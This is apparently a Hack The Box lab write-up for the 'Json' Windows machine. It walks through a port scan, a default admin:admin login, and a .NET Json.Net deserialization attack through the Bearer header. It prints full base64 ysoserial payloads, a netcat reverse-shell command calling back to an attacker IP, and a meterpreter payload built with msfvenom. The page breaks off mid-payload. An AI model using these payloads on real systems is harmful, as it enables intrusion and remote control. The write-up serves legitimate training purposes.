@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"><head>
+
+<meta charset="utf-8">
+<meta name="generator" content="quarto-1.7.32">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+
+<meta name="author" content="0xPThree">
+<meta name="dcterms.date" content="2020-01-22">
+<meta name="description" content="Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.">
+
+<title>Json - Hack The Box – Exploit.se</title>
+<style>
+code{white-space: pre-wrap;}
+span.smallcaps{font-variant: small-caps;}
+div.columns{display: flex; gap: min(4vw, 1.5em);}
+div.column{flex: auto; overflow-x: auto;}
+div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+ul.task-list{list-style: none;}
+ul.task-list li input[type="checkbox"] {
+  width: 0.8em;
+  margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
+  vertical-align: middle;
+}
+</style>
+
+
+<script src="../../site_libs/quarto-nav/quarto-nav.js"></script>
+<script src="../../site_libs/quarto-nav/headroom.min.js"></script>
+<script src="../../site_libs/clipboard/clipboard.min.js"></script>
+<script src="../../site_libs/quarto-search/autocomplete.umd.js"></script>
+<script src="../../site_libs/quarto-search/fuse.min.js"></script>
+<script src="../../site_libs/quarto-search/quarto-search.js"></script>
+<meta name="quarto:offset" content="../../">
+<link href="../../favicon.ico" rel="icon">
+<script src="../../site_libs/quarto-html/quarto.js" type="module"></script>
+<script src="../../site_libs/quarto-html/tabsets/tabsets.js" type="module"></script>
+<script src="../../site_libs/quarto-html/popper.min.js"></script>
+<script src="../../site_libs/quarto-html/tippy.umd.min.js"></script>
+<script src="../../site_libs/quarto-html/anchor.min.js"></script>
+<link href="../../site_libs/quarto-html/tippy.css" rel="stylesheet">
+<link href="../../site_libs/quarto-html/quarto-syntax-highlighting-37eea08aefeeee20ff55810ff984fec1.css" rel="stylesheet" id="quarto-text-highlighting-styles">
+<script src="../../site_libs/bootstrap/bootstrap.min.js"></script>
+<link href="../../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
+<link href="../../site_libs/bootstrap/bootstrap-a98ec624fb63d9b712fc3a6f62e2b305.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="light">
+<script id="quarto-search-options" type="application/json">{
+  "location": "navbar",
+  "copy-button": false,
+  "collapse-after": 3,
+  "panel-placement": "end",
+  "type": "overlay",
+  "limit": 50,
+  "keyboard-shortcut": [
+    "f",
+    "/",
+    "s"
+  ],
+  "show-item-context": false,
+  "language": {
+    "search-no-results-text": "No results",
+    "search-matching-documents-text": "matching documents",
+    "search-copy-link-title": "Copy link to search",
+    "search-hide-matches-text": "Hide additional matches",
+    "search-more-match-text": "more match in this document",
+    "search-more-matches-text": "more matches in this document",
+    "search-clear-button-title": "Clear",
+    "search-text-placeholder": "",
+    "search-detached-cancel-button-title": "Cancel",
+    "search-submit-button-title": "Submit",
+    "search-label": "Search"
+  }
+}</script>
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-XVW5CQ7DG5"></script>
+
+<script type="text/javascript">
+
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-XVW5CQ7DG5', { 'anonymize_ip': true});
+</script>
+
+
+<link rel="stylesheet" href="../../scss/styles.css">
+<link rel="stylesheet" href="../../scss/bootstrap-dark.min.css">
+<link rel="stylesheet" href="../../scss/quarto-syntax-highlighting-dark.css">
+<link rel="stylesheet" href="../../scss/bootstrap-icons.css">
+</head>
+
+<body class="nav-fixed quarto-light">
+
+<div id="quarto-search-results"></div>
+  <header id="quarto-header" class="headroom fixed-top quarto-banner">
+    <nav class="navbar navbar-expand-lg " data-bs-theme="dark">
+      <div class="navbar-container container-fluid">
+      <div class="navbar-brand-container mx-auto">
+    <a href="../../index.html" class="navbar-brand navbar-brand-logo">
+    <img src="../../static/exploit_white-orange.png" alt="" class="navbar-logo">
+    </a>
+  </div>
+            <div id="quarto-search" class="" title="Search"></div>
+          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" role="menu" aria-expanded="false" aria-label="Toggle navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
+  <span class="navbar-toggler-icon"></span>
+</button>
+          <div class="collapse navbar-collapse" id="navbarCollapse">
+            <ul class="navbar-nav navbar-nav-scroll ms-auto">
+  <li class="nav-item">
+    <a class="nav-link" href="../../writeups.html"> 
+<span class="menu-text">Writeups</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="https://0xpthree.gitbook.io/notes"> 
+<span class="menu-text">Notes</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="../../about.html"> 
+<span class="menu-text">About</span></a>
+  </li>  
+</ul>
+          </div> <!-- /navcollapse -->
+            <div class="quarto-navbar-tools">
+</div>
+      </div> <!-- /container-fluid -->
+    </nav>
+</header>
+<!-- content -->
+<header id="title-block-header" class="quarto-title-block default page-columns page-full">
+  <div class="quarto-title-banner page-columns page-full">
+    <div class="quarto-title column-body">
+      <h1 class="title">Json - Hack The Box</h1>
+                  <div>
+        <div class="description">
+          Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.
+        </div>
+      </div>
+                          <div class="quarto-categories">
+                <div class="quarto-category">hackthebox</div>
+              </div>
+                  </div>
+  </div>
+    
+  
+  <div class="quarto-title-meta">
+
+      <div>
+      <div class="quarto-title-meta-heading">Author</div>
+      <div class="quarto-title-meta-contents">
+               <p>0xPThree </p>
+            </div>
+    </div>
+      
+      <div>
+      <div class="quarto-title-meta-heading">Published</div>
+      <div class="quarto-title-meta-contents">
+        <p class="date">January 22, 2020</p>
+      </div>
+    </div>
+    
+      
+    </div>
+    
+  
+  </header><div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article page-navbar">
+<!-- sidebar -->
+<!-- margin-sidebar -->
+    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar zindex-bottom">
+        
+    </div>
+<!-- main -->
+<main class="content quarto-banner-title-block" id="quarto-document-content">
+
+
+
+
+
+<p><img src="images/json_logo.png" class="img-fluid"></p>
+<p>“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”</p>
+<hr>
+<p>██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝</p>
+<ol type="1">
+<li><p>root@p3:/opt/htb/machines/json#nmapAutomatorDirb.sh 10.10.10.158 All PORT STATE SERVICE VERSION 21/tcp open ftp FileZilla ftpd | ftp-syst: |_ SYST: UNIX emulated by FileZilla 80/tcp open http Microsoft IIS httpd 8.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/8.5 |_http-title: Json HTB 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC 49158/tcp open msrpc Microsoft Windows RPC</p>
+<p>Host script results: |<em>clock-skew: mean: 4h00m26s, deviation: 0s, median: 4h00m26s |<em>nbstat: NetBIOS name: JSON, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:e7:01 (VMware) |<em>smb-os-discovery: ERROR: Script execution failed (use -d to debug) | smb-security-mode: | account_used: <blank> | authentication_level: user | challenge_response: supported |</blank></em> message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |</unknown></em> Message signing enabled but not required | smb2-time: | date: 2020-01-23T11:41:50 |</em> start_date: 2020-01-22T22:01:06</p>
+<p>PORT STATE SERVICE VERSION 137/udp open netbios-ns Microsoft Windows netbios-ns (workgroup: WORKGROUP)</p>
+<p>Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</p>
+<p>==&gt; DIRECTORY: http://10.10.10.158/css/ ==&gt; DIRECTORY: http://10.10.10.158/files/ ==&gt; DIRECTORY: http://10.10.10.158/img/</p>
+<ul>
+<li>http://10.10.10.158/index.html (CODE:200|SIZE:40163) ==&gt; DIRECTORY: http://10.10.10.158/js/ ==&gt; DIRECTORY: http://10.10.10.158/views/</li>
+</ul></li>
+<li><p>We are unable to get any unauthenticated information via rpcclient, smbclient or ftp. Visiting the webpage shows us a brief authenticated session, and then we are forwarded to the login page /login.html. The site is unsecure (http) and by looking at the js data we can identify that it uses OAuth2 and Bearer tokens. Looking further at app.min.js we find a few functions, ‘/api/token’ and ‘/api/Account/’.</p></li>
+</ol>
+<p>Using curl we can try to get a bearer token, although it’s a guessing game.</p>
+<p>root@p3:/opt/htb/machines/json# curl -v json.htb/api/token -H ‘Accept: application/json’ -H ‘Content-Type: application/json’ –data ‘{“UserName”:“admin”,“Password”:“password”}’ * Trying 10.10.10.158:80… * TCP_NODELAY set * Connected to json.htb (10.10.10.158) port 80 (#0) &gt; POST /api/token HTTP/1.1 &gt; Host: json.htb &gt; User-Agent: curl/7.67.0 &gt; Accept: application/json &gt; Content-Type: application/json &gt; Content-Length: 42 &gt; * upload completely sent off: 42 out of 42 bytes * Mark bundle as not supporting multiuse &lt; HTTP/1.1 404 Not Found &lt; Cache-Control: no-cache &lt; Pragma: no-cache &lt; Content-Type: application/json; charset=utf-8 &lt; Expires: -1 &lt; Server: Microsoft-IIS/8.5 &lt; X-AspNet-Version: 4.0.30319 &lt; X-Powered-By: ASP.NET &lt; Date: Thu, 23 Jan 2020 13:31:23 GMT &lt; Content-Length: 17 &lt; * Connection #0 to host json.htb left intact “User Not Exists”</p>
+<p>The Credentials admin:password doesn’t work, however admin:admin do work and we get a base64 encrypted OAuth2 cookie. root@p3:/opt/htb/machines/json# curl -v json.htb/api/token -H ‘Accept: application/json’ -H ‘Content-Type: application/json’ –data ‘{“UserName”:“admin”,“Password”:“admin”}’ * Trying 10.10.10.158:80… * TCP_NODELAY set * Connected to json.htb (10.10.10.158) port 80 (#0) &gt; POST /api/token HTTP/1.1 &gt; Host: json.htb &gt; User-Agent: curl/7.67.0 &gt; Accept: application/json &gt; Content-Type: application/json &gt; Content-Length: 39 &gt; * upload completely sent off: 39 out of 39 bytes * Mark bundle as not supporting multiuse &lt; HTTP/1.1 202 Accepted &lt; Cache-Control: no-cache &lt; Pragma: no-cache &lt; Expires: -1 &lt; Server: Microsoft-IIS/8.5 &lt; X-AspNet-Version: 4.0.30319 &lt; Set-Cookie: OAuth2=eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=; expires=Thu, 23-Jan-2020 13:34:52 GMT; path=/ &lt; X-Powered-By: ASP.NET &lt; Date: Thu, 23 Jan 2020 13:32:52 GMT &lt; Content-Length: 0 &lt; * Connection #0 to host json.htb left intact</p>
+<p>Decrypting the OAuth2 info gives us: {“Id”:1,“UserName”:“admin”,“Password”:“21232f297a57a5a743894a0e4a801fc3”,“Name”:“User Admin HTB”,“Rol”:“Administrator”}</p>
+<p>Instead of decrypting the OAuth2 data, we could also send it as a Bearer token using the header option ‘Bearer’. This would produce the same result.</p>
+<p>root@p3:/opt/htb/machines/json# curl -v 10.10.10.158/api/Account/ -H ‘Accept: application/json’ -H ‘Content-Type: application/json’ -H ‘Bearer: eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=’ * Trying 10.10.10.158:80… * TCP_NODELAY set * Connected to 10.10.10.158 (10.10.10.158) port 80 (#0) &gt; GET /api/Account/ HTTP/1.1 &gt; Host: 10.10.10.158 &gt; User-Agent: curl/7.67.0 &gt; Accept: application/json &gt; Content-Type: application/json &gt; Bearer: eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0= &gt; * Mark bundle as not supporting multiuse &lt; HTTP/1.1 200 OK &lt; Cache-Control: no-cache &lt; Pragma: no-cache &lt; Content-Type: application/json; charset=utf-8 &lt; Expires: -1 &lt; Server: Microsoft-IIS/8.5 &lt; X-AspNet-Version: 4.0.30319 &lt; X-Powered-By: ASP.NET &lt; Date: Thu, 23 Jan 2020 13:37:59 GMT &lt; Content-Length: 119 &lt; * Connection #0 to host 10.10.10.158 left intact {“Id”:1,“UserName”:“admin”,“Password”:“21232f297a57a5a743894a0e4a801fc3”,“Name”:“User Admin HTB”,“Rol”:“Administrator”}</p>
+<ol start="3" type="1">
+<li>As we can see in the response it is a .NET application and we can inject data in to the Bearer. Googling around there is an deserialization RCE attack possible using ysoserial.NET. To create our payload it’s easiest using a windows box.</li>
+</ol>
+<p>We create a poc payload that will ping our localhost to verify functionality.</p>
+<blockquote class="blockquote">
+<p>ysoserial.exe -g WindowsIdentity -f Json.Net -o base64 -c “ping 10.10.14.8” &gt; rce-ping.txt</p>
+</blockquote>
+<p>Replace the legit Bearer data with our new created payload. Before executing the curl / Burp request setup tcpdump to confirm the incomming icmp from the victim machine.</p>
+<p>curl -v 10.10.10.158/api/Account/ -H ‘Accept: application/json’ -H ‘Content-Type: application/json’ -H ‘Bearer: ewogICAgICAgICAgICAgICAgICAgICckdHlwZSc6ICdTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywKICAgICAgICAgICAgICAgICAgICAnU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmJvb3RzdHJhcENvbnRleHQnOiAnQUFFQUFBRC8vLy8vQVFBQUFBQUFBQUFNQWdBQUFFbFRlWE4wWlcwc0lGWmxjbk5wYjI0OU5DNHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajFpTnpkaE5XTTFOakU1TXpSbE1EZzVCUUVBQUFDRUFWTjVjM1JsYlM1RGIyeHNaV04wYVc5dWN5NUhaVzVsY21sakxsTnZjblJsWkZObGRHQXhXMXRUZVhOMFpXMHVVM1J5YVc1bkxDQnRjMk52Y214cFlpd2dWbVZ5YzJsdmJqMDBMakF1TUM0d0xDQkRkV3gwZFhKbFBXNWxkWFJ5WVd3c0lGQjFZbXhwWTB0bGVWUnZhMlZ1UFdJM04yRTFZelUyTVRrek5HVXdPRGxkWFFRQUFBQUZRMjkxYm5RSVEyOXRjR0Z5WlhJSFZtVnljMmx2YmdWSmRHVnRjd0FEQUFZSWpRRlRlWE4wWlcwdVEyOXNiR1ZqZEdsdmJuTXVSMlZ1WlhKcFl5NURiMjF3WVhKcGMyOXVRMjl0Y0dGeVpYSmdNVnRiVTNsemRHVnRMbE4wY21sdVp5d2diWE5qYjNKc2FXSXNJRlpsY25OcGIyNDlOQzR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1WFYwSUFnQUFBQUlBQUFBSkF3QUFBQUlBQUFBSkJBQUFBQVFEQUFBQWpRRlRlWE4wWlcwdVEyOXNiR1ZqZEdsdmJuTXVSMlZ1WlhKcFl5NURiMjF3WVhKcGMyOXVRMjl0Y0dGeVpYSmdNVnRiVTNsemRHVnRMbE4wY21sdVp5d2diWE5qYjNKc2FXSXNJRlpsY25OcGIyNDlOQzR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1WFYwQkFBQUFDMTlqYjIxd1lYSnBjMjl1QXlKVGVYTjBaVzB1UkdWc1pXZGhkR1ZUWlhKcFlXeHBlbUYwYVc5dVNHOXNaR1Z5Q1FVQUFBQVJCQUFBQUFJQUFBQUdCZ0FBQUJJdll5QndhVzVuSURFd0xqRXdMakUwTGpnR0J3QUFBQU5qYldRRUJRQUFBQ0pUZVhOMFpXMHVSR1ZzWldkaGRHVlRaWEpwWVd4cGVtRjBhVzl1U0c5c1pHVnlBd0FBQUFoRVpXeGxaMkYwWlFkdFpYUm9iMlF3QjIxbGRHaHZaREVEQXdNd1UzbHpkR1Z0TGtSbGJHVm5ZWFJsVTJWeWFXRnNhWHBoZEdsdmJraHZiR1JsY2l0RVpXeGxaMkYwWlVWdWRISjVMMU41YzNSbGJTNVNaV1pzWldOMGFXOXVMazFsYldKbGNrbHVabTlUWlhKcFlXeHBlbUYwYVc5dVNHOXNaR1Z5TDFONWMzUmxiUzVTWldac1pXTjBhVzl1TGsxbGJXSmxja2x1Wm05VFpYSnBZV3hwZW1GMGFXOXVTRzlzWkdWeUNRZ0FBQUFKQ1FBQUFBa0tBQUFBQkFnQUFBQXdVM2x6ZEdWdExrUmxiR1ZuWVhSbFUyVnlhV0ZzYVhwaGRHbHZia2h2YkdSbGNpdEVaV3hsWjJGMFpVVnVkSEo1QndBQUFBUjBlWEJsQ0dGemMyVnRZbXg1Qm5SaGNtZGxkQkowWVhKblpYUlVlWEJsUVhOelpXMWliSGtPZEdGeVoyVjBWSGx3WlU1aGJXVUtiV1YwYUc5a1RtRnRaUTFrWld4bFoyRjBaVVZ1ZEhKNUFRRUNBUUVCQXpCVGVYTjBaVzB1UkdWc1pXZGhkR1ZUWlhKcFlXeHBlbUYwYVc5dVNHOXNaR1Z5SzBSbGJHVm5ZWFJsUlc1MGNua0dDd0FBQUxBQ1UzbHpkR1Z0TGtaMWJtTmdNMXRiVTNsemRHVnRMbE4wY21sdVp5d2diWE5qYjNKc2FXSXNJRlpsY25OcGIyNDlOQzR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1WFN4YlUzbHpkR1Z0TGxOMGNtbHVaeXdnYlhOamIzSnNhV0lzSUZabGNuTnBiMjQ5TkM0d0xqQXVNQ3dnUTNWc2RIVnlaVDF1WlhWMGNtRnNMQ0JRZFdKc2FXTkxaWGxVYjJ0bGJqMWlOemRoTldNMU5qRTVNelJsTURnNVhTeGJVM2x6ZEdWdExrUnBZV2R1YjNOMGFXTnpMbEJ5YjJObGMzTXNJRk41YzNSbGJTd2dWbVZ5YzJsdmJqMDBMakF1TUM0d0xDQkRkV3gwZFhKbFBXNWxkWFJ5WVd3c0lGQjFZbXhwWTB0bGVWUnZhMlZ1UFdJM04yRTFZelUyTVRrek5HVXdPRGxkWFFZTUFBQUFTMjF6WTI5eWJHbGlMQ0JXWlhKemFXOXVQVFF1TUM0d0xqQXNJRU4xYkhSMWNtVTlibVYxZEhKaGJDd2dVSFZpYkdsalMyVjVWRzlyWlc0OVlqYzNZVFZqTlRZeE9UTTBaVEE0T1FvR0RRQUFBRWxUZVhOMFpXMHNJRlpsY25OcGIyNDlOQzR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1Qmc0QUFBQWFVM2x6ZEdWdExrUnBZV2R1YjNOMGFXTnpMbEJ5YjJObGMzTUdEd0FBQUFWVGRHRnlkQWtRQUFBQUJBa0FBQUF2VTNsemRHVnRMbEpsWm14bFkzUnBiMjR1VFdWdFltVnlTVzVtYjFObGNtbGhiR2w2WVhScGIyNUliMnhrWlhJSEFBQUFCRTVoYldVTVFYTnpaVzFpYkhsT1lXMWxDVU5zWVhOelRtRnRaUWxUYVdkdVlYUjFjbVVLVTJsbmJtRjBkWEpsTWdwTlpXMWlaWEpVZVhCbEVFZGxibVZ5YVdOQmNtZDFiV1Z1ZEhNQkFRRUJBUUFEQ0ExVGVYTjBaVzB1Vkhsd1pWdGRDUThBQUFBSkRRQUFBQWtPQUFBQUJoUUFBQUErVTNsemRHVnRMa1JwWVdkdWIzTjBhV056TGxCeWIyTmxjM01nVTNSaGNuUW9VM2x6ZEdWdExsTjBjbWx1Wnl3Z1UzbHpkR1Z0TGxOMGNtbHVaeWtHRlFBQUFENVRlWE4wWlcwdVJHbGhaMjV2YzNScFkzTXVVSEp2WTJWemN5QlRkR0Z5ZENoVGVYTjBaVzB1VTNSeWFXNW5MQ0JUZVhOMFpXMHVVM1J5YVc1bktRZ0FBQUFLQVFvQUFBQUpBQUFBQmhZQUFBQUhRMjl0Y0dGeVpRa01BQUFBQmhnQUFBQU5VM2x6ZEdWdExsTjBjbWx1WndZWkFBQUFLMGx1ZERNeUlFTnZiWEJoY21Vb1UzbHpkR1Z0TGxOMGNtbHVaeXdnVTNsemRHVnRMbE4wY21sdVp5a0dHZ0FBQURKVGVYTjBaVzB1U1c1ME16SWdRMjl0Y0dGeVpTaFRlWE4wWlcwdVUzUnlhVzVuTENCVGVYTjBaVzB1VTNSeWFXNW5LUWdBQUFBS0FSQUFBQUFJQUFBQUJoc0FBQUJ4VTNsemRHVnRMa052YlhCaGNtbHpiMjVnTVZ0YlUzbHpkR1Z0TGxOMGNtbHVaeXdnYlhOamIzSnNhV0lzSUZabGNuTnBiMjQ5TkM0d0xqQXVNQ3dnUTNWc2RIVnlaVDF1WlhWMGNtRnNMQ0JRZFdKc2FXTkxaWGxVYjJ0bGJqMWlOemRoTldNMU5qRTVNelJsTURnNVhWMEpEQUFBQUFvSkRBQUFBQWtZQUFBQUNSWUFBQUFLQ3c9PScKICAgICAgICAgICAgICAgIH0=’</p>
+<p>root@p3:/opt/htb/machines/json# tcpdump -i tun0 icmp tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes 08:21:47.434315 IP json.htb &gt; p3: ICMP echo request, id 1, seq 17, length 40 08:21:47.434337 IP p3 &gt; json.htb: ICMP echo reply, id 1, seq 17, length 40 08:21:48.450946 IP json.htb &gt; p3: ICMP echo request, id 1, seq 18, length 40 08:21:48.450982 IP p3 &gt; json.htb: ICMP echo reply, id 1, seq 18, length 40 08:21:49.466503 IP json.htb &gt; p3: ICMP echo request, id 1, seq 19, length 40 08:21:49.466542 IP p3 &gt; json.htb: ICMP echo reply, id 1, seq 19, length 40 08:21:50.482371 IP json.htb &gt; p3: ICMP echo request, id 1, seq 20, length 40 08:21:50.482411 IP p3 &gt; json.htb: ICMP echo reply, id 1, seq 20, length 40</p>
+<p>ICMP comming from json.htb &gt; p3 confirms that the rce is working. We now need to militarize this to get user.</p>
+<ol start="4" type="1">
+<li>Just like normally I create the reverse shell executing nc64.exe from my smb share. &gt; ysoserial.exe -g WindowsIdentity -f Json.Net -o base64 -c “\10.10.14.8-share64.exe 10.10.14.8 4488 -e powershell” &gt; rce-reverse.txt</li>
+</ol>
+<p>Running the newly created payload gives us a reverse connecting, however it halts. We are unable to do anything.</p>
+<p>root@p3:/opt/htb/machines/json# nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.8] from (UNKNOWN) [10.10.10.158] 55376 Windows PowerShell Copyright (C) 2014 Microsoft Corporation. All rights reserved.</p>
+<p>We need to create a new payload, this time lets use msfvenom to create a reverse meterpreter session.</p>
+<p>root@p3:/opt/htb/machines/json# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.8 LPORT=4400 -f exe &gt; json-expl.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder or badchars specified, outputting raw payload Payload size: 510 bytes Final size of exe file: 7168 bytes</p>
+<p>Create a new (Bearer) execution using ysoserial to tigger the reverse meterpreter. &gt; ysoserial.exe -g WindowsIdentity -f Json.Net -o base64 -c “\10.10.14.8-share-expl.exe” &gt; rce-meterpreter.txt</p>
+<p>We now have the two components needed to get the shell. Start up msfdb exploit/multi/handler and use payload windows/x64/meterpreter/reverse_tcp to receive the reverse.</p>
+<p>root@p3:/srv/pub-share# curl -v 10.10.10.158/api/Account/ -H ‘Accept: application/json’ -H ‘Content-Type: application/json’ -H ‘Bearer: ewogICAgICAgICAgICAgICAgICAgICckdHlwZSc6ICdTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywKICAgICAgICAgICAgICAgICAgICAnU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmJvb3RzdHJhcENvbnRleHQnOiAnQUFFQUFBRC8vLy8vQVFBQUFBQUFBQUFNQWdBQUFFbFRlWE4wWlcwc0lGWmxjbk5wYjI0OU5DNHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajFpTnpkaE5XTTFOakU1TXpSbE1EZzVCUUVBQUFDRUFWTjVjM1JsYlM1RGIyeHNaV04wYVc5dWN5NUhaVzVsY21sakxsTnZjblJsWkZObGRHQXhXMXRUZVhOMFpXMHVVM1J5YVc1bkxDQnRjMk52Y214cFlpd2dWbVZ5YzJsdmJqMDBMakF1TUM0d0xDQkRkV3gwZFhKbFBXNWxkWFJ5WVd3c0lGQjFZbXhwWTB0bGVWUnZhMlZ1UFdJM04yRTFZelUyTVRrek5HVXdPRGxkWFFRQUFBQUZRMjkxYm5RSVEyOXRjR0Z5WlhJSFZtVnljMmx2YmdWSmRHVnRjd0FEQUFZSWpRRlRlWE4wWlcwdVEyOXNiR1ZqZEdsdmJuTXVSMlZ1WlhKcFl5NURiMjF3WVhKcGMyOXVRMjl0Y0dGeVpYSmdNVnRiVTNsemRHVnRMbE4wY21sdVp5d2diWE5qYjNKc2FXSXNJRlpsY25OcGIyNDlOQzR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1WFYwSUFnQUFBQUlBQUFBSkF3QUFBQUlBQUFBSkJBQUFBQVFEQUFBQWpRRlRlWE4wWlcwdVEyOXNiR1ZqZEdsdmJuTXVSMlZ1WlhKcFl5NURiMjF3WVhKcGMyOXVRMjl0Y0dGeVpYSmdNVnRiVTNsemRHVnRMbE4wY21sdVp5d2diWE5qYjNKc2FXSXNJRlpsY25OcGIyNDlOQzR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1WFYwQkFBQUFDMTlqYjIxd1lYSnBjMjl1QXlKVGVYTjBaVzB1UkdWc1pXZGhkR1ZUWlhKcFlXeHBlbUYwYVc5dVNHOXNaR1Z5Q1FVQUFBQVJCQUFBQUFJQUFBQUdCZ0FBQUNjdll5QmNYREV3TGpFd0xqRTBMamhjY0hWaUxYTm9ZWEpsWEdwemIyNHRaWGh3YkM1bGVHVUdCd0FBQUFOamJXUUVCUUFBQUNKVGVYTjBaVzB1UkdWc1pXZGhkR1ZUWlhKcFlXeHBlbUYwYVc5dVNHOXNaR1Z5QXdBQUFBaEVaV3hsWjJGMFpRZHRaWFJvYjJRd0IyMWxkR2h2WkRFREF3TXdVM2x6ZEdWdExrUmxiR1ZuWVhSbFUyVnlhV0ZzYVhwaGRHbHZia2h2YkdSbGNpdEVaV3hsWjJGMFpVVnVkSEo1TDFONWMzUmxiUzVTWldac1pXTjBhVzl1TGsxbGJXSmxja2x1Wm05VFpYSnBZV3hwZW1GMGF